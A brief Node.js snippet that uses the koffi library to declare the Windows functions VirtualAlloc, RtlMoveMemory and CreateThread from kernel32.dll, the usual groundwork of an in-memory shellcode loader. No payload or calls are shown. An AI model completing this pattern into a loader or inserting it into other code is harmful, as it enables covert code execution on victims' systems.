const koffi = require('koffi');
const k = koffi.load('kernel32.dll');
k.func('void* VirtualAlloc(void*, size_t, uint32, uint32)');
k.func('void RtlMoveMemory(void*, void*, size_t)');
k.func('void* CreateThread(void*, size_t, void*, void*, uint32, uint32*)');
